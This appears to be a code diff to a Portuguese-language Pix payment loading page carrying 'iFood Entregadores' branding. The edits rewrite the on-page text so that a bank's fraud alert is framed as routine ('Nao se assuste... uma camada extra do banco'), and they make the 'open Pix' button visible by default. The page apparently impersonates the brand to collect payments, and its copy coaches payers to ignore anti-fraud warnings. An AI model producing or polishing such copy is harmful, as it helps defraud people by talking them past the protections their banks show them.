@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=10.9">
+    <link rel="stylesheet" href="style.css?v=11.0">
 </head>
 <body data-page="pix-loading">
     <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
@@ -26,29 +26,29 @@
                 </div>
 
                 <span class="pix-loading-kicker">Pix sendo gerado</span>
-                <h1>Antes de pagar, confira o nome do recebedor</h1>
+                <h1>Confira o nome antes de pagar</h1>
                 <p class="pix-loading-copy">
-                    Alguns bancos exibem uma confirmacao extra de seguranca antes do Pix. Isso pode acontecer em pagamentos online. Confira o nome abaixo e continue somente se ele aparecer igual no aplicativo do seu banco.
+                    Seu banco pode mostrar um aviso de fraude ou seguranca antes do Pix. Isso e uma verificacao automatica. Confira o nome abaixo no aplicativo do banco e continue somente se o recebedor for o mesmo.
                 </p>
 
                 <div id="pix-loading-merchant-card" class="pix-loading-merchant">
-                    <span>Confira se o Pix esta neste nome</span>
+                    <span>O Pix deve aparecer neste nome</span>
                     <strong id="pix-loading-merchant-name">-</strong>
                 </div>
 
                 <div id="pix-loading-merchant-fallback" class="pix-loading-warning hidden">
                     <strong>Confira os dados no app do banco</strong>
-                    <span>O nome do recebedor deve aparecer na tela de confirmacao antes de concluir o pagamento.</span>
+                    <span>Antes de concluir, veja se o recebedor e o valor estao corretos.</span>
                 </div>
 
                 <div class="pix-loading-security">
                     <div>
-                        <strong>Aviso do banco</strong>
-                        <span>Se aparecer uma tela de seguranca, revise os dados e confirme apenas se o recebedor estiver correto.</span>
+                        <strong>Se aparecer aviso de fraude</strong>
+                        <span>Nao se assuste. E uma camada extra do banco. Confira o nome do recebedor e o valor antes de seguir.</span>
                     </div>
                     <div>
-                        <strong>Pagamento seguro</strong>
-                        <span>O codigo Pix sera exibido na proxima tela para copiar ou escanear com QR Code.</span>
+                        <strong>Quando estiver tudo certo</strong>
+                        <span>Toque no botao abaixo para abrir o Pix, copiar o codigo ou escanear o QR Code.</span>
                     </div>
                 </div>
 
@@ -59,8 +59,8 @@
                     </div>
                 </div>
 
-                <button id="btn-pix-loading-continue" class="btn-primary pix-loading-btn hidden" type="button">
-                    Abrir Pix agora
+                <button id="btn-pix-loading-continue" class="btn-primary pix-loading-btn" type="button">
+                    Conferi o nome, abrir Pix
                 </button>
             </div>
         </section>
@@ -72,6 +72,6 @@
         <p>&copy; 2025 iFood Entregadores. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=10.9" defer></script>
+    <script src="script.js?v=11.0" defer></script>
 </body>
 </html>
